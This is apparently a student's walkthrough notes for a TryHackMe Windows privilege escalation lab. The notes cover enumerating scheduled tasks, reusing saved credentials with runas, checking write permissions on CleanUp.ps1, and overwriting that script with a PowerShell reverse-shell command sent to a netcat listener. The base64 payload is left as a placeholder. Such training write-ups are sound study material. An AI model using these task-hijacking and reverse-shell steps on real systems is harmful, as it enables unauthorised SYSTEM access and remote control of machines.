# Windows Privilege Escalation via Scheduled Tasks | From User to SYSTEM

```jsx
Room: [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)
```

**→Scheduled Tasks vs Service**

2 types of enumeration and exploitation

xfreerdp

```jsx
xfreerdp /u:user /p:password321 /cert:ignore /v:10.145.175.204 /smart-sizing
```

Scheduled Task in Table Format

```jsx
schtasks
schtasks /fo LIST
schtasks /fo LIST | findstr /I taskname
schtasks /fo LIST | findstr /I taskname  | findstr /I /V microsoft
schtasks /tn SaveCred /fo list /v
"type C:\PrivEsc\savecred.bat"
```

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image.png)

```jsx
runas /user:admin cmd.exe 
whoami
```

2nd technique

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%201.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%202.png)

File permission check

```jsx
icacls CleanUp.ps1
```

Option pass

```jsx
c:\PrivEsc\accesschk.exe -accepteula CleanUp.ps1
c:\PrivEsc\accesschk.exe -accepteula -q leanUp.ps1
```

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%203.png)

My user permission

```jsx
c:\PrivEsc\accesschk.exe -accepteula -qu user CleanUp.ps1
```

EXECUTE PERMISSION OR NOT(Verbose)

```jsx
c:\PrivEsc\accesschk.exe -accepteula -quv user CleanUp.ps1
```

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%204.png)

Input my input to a file

```jsx
echo hello > CleanUp.ps1
type CleanUp
```

```jsx
echo  'c:\user\test.txt' > CleanUp.ps1
```

Character escaping

```jsx
echo ^> c:\users\user\test.txt > CleanUp.ps1
```

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%205.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%206.png)

Reverse Shell Generator

```jsx
https://www.revshells.com/
```

On Attacking Machine

```jsx
nc -lvnp 4444
```

```jsx
echo powershell -e Powershell_Base64_code > CleanUp.ps1
```

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%207.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Scheduled%20Tasks%20F/image%208.png)